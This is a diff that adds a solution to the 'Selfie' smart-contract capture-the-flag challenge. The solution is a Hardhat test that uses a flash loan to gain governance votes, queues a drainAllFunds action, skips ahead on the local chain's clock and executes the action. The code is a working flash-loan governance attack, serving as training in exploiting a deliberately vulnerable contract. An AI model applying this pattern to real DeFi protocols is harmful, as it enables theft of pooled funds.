@@ -31,6 +31,34 @@ describe('[Challenge] Selfie', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+
+        //using the flash loan to gain voting power and create an action that calls drainAllFunds method of the pool
+
+        const AttackerContractFactory = await ethers.getContractFactory("SelfiePoolAttacker",attacker);
+
+        const ABI = [ "function drainAllFunds(address receiver) external" ];
+        
+        const iface = new ethers.utils.Interface(ABI);
+        
+        const data = iface.encodeFunctionData("drainAllFunds", [attacker.address]);
+
+        const attackerContract = await AttackerContractFactory.deploy(
+            data,
+            this.pool.address,
+            this.governance.address,
+        );
+
+        await attackerContract.flashLoan(TOKENS_IN_POOL);
+
+        //waiting more than the required time to run an action (2 days)
+
+        const threeDays = 3 * 24 * 60 * 60;
+        await ethers.provider.send("evm_increaseTime", [threeDays]);
+
+        const actionId = await attackerContract.actionId();
+
+        const governance = await this.governance.connect(attacker);
+        await governance.executeAction(actionId);
     });
 
     after(async function () {
